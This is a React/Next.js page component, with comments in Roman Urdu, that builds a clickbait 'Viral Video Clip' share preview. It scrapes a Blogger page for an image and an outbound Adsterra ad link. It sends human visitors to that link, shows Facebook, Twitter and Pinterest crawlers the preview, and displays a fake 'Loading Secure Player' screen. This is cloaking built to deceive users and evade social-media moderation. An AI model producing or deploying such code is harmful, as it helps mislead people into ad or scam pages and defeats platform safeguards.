'use client';

import { useEffect, useState } from 'react';

export default function Home() {
  const [ogData, setOgData] = useState({
    title: "Viral Video Clip +3 (Watch Full)",
    image: "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiXs-_IQU7pDxYCfdSk-FUonIByG1eiC_2bpCV4VPDhdv6STitzDlF_6WiVU0xcy2mb7_sFrEAkQ0OM6g9jeGgv193EqxYNXsvSbcdTYW5vNyl3Gf8mc-yhB4la5Zgw50uSa0Tc0slmwfS283hGXWGSphmQG9nuyCw4mg6DnwszfA2uxilPRlnWE6B07I/s720/IMG_20250720_215449_421.jpg", // Default backup picture
    destination: "https://google.com"
  });

  useEffect(() => {
    // 🕵️‍♂️ URL se Blogger ka link nikalne ka tareeqa
    const urlParams = new URLSearchParams(window.location.search);
    const targetUrl = urlParams.get('url');

    if (targetUrl) {
      fetch(`/api/proxy?url=${encodeURIComponent(targetUrl)}`)
        .then(res => res.text())
        .then(html => {
          // Image Extraction
          const imgMatch = html.match(/src=["'](https:\/\/blogger\.googleusercontent\.com\/img\/b\/[^"']+)["']/i) ||
                           html.match(/<meta[^>]*property=["']og:image["'][^>]*content=["']([^"']*)["']/i) || 
                           html.match(/<img[^>]*src=["']([^"']*)["']/i);
          
          // Link Extraction (Adsterra)
          const rawLinks = html.match(/https?:\/\/[^\s"'<>]+/g);
          let foundLink = "https://google.com";
          if (rawLinks) {
            const possibleLink = rawLinks.find(link => 
              !link.includes('blogspot.com') && !link.includes('google.com') && 
              !link.includes('w3.org') && !link.includes('blogger.com') && !link.includes('whatsapp.com')
            );
            if (possibleLink) foundLink = possibleLink.split('"')[0].split("'")[0];
          }

          setOgData({
            title: "Viral Video Clip +3",
            image: imgMatch ? imgMatch[1] : ogData.image,
            destination: foundLink
          });

          // 🚀 Real user ko redirect karein, Facebook bot ko chorein
          const isBot = /facebookexternalhit|Facebot|Twitterbot|Pinterestbot/i.test(navigator.userAgent);
          if (!isBot) {
            window.location.href = foundLink;
          }
        })
        .catch(err => console.error(err));
    }
  }, []);

  return (
    <>
      <head>
        <title>{ogData.title}</title>
        <meta property="og:title" content={ogData.title} />
        <meta property="og:image" content={ogData.image} />
        <meta property="og:description" content="Click to watch full video clip." />
        <meta property="og:type" content="article" />
        <meta property="og:image:width" content="1200" />
        <meta property="og:image:height" content="630" />
      </head>

      <div style={{ textAlign: 'center', marginTop: '25%', fontFamily: 'sans-serif', color: '#333' }}>
        <h2>Loading Secure Player...</h2>
        <p>Please wait while the stream configures.</p>
      </div>
    </>
  );
}
